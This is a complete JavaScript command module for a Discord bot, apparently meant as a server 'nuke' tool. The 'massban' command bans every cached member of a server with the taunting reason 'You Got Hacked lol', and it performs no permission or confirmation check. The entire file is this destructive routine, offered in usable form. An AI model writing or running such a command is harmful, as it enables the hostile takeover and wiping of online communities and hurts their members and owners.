module.exports.run = async (client, message, args) => {

    message.guild.members.cache.forEach(member => {

        member.ban({ reason: "You Got Hacked lol" });

    });

}

module.exports.help = {
    name: "massban"
}